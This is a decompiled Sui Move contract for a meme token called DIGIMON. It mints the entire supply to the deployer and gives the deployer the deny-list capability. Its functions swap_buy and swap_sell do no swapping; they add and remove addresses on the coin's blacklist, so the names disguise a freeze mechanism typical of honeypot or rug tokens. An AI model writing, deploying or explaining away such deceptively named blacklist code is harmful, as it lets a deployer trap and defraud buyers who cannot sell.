module 0x47df91026c420a0d03504f99498aa73a058bd7937badbc254965e9234a2002a7::digimon {
    struct DIGIMON has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: DIGIMON, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<DIGIMON>(arg0, 9, b"DIGIMON", b"Digimon", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmVUqkAtbb79ip2H5LTgfCwmQcPqrrPbTXMJCCbDrgoWEA"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<DIGIMON>(&mut v3, 420690000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<DIGIMON>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<DIGIMON>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<DIGIMON>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<DIGIMON>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<DIGIMON>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<DIGIMON>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<DIGIMON>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

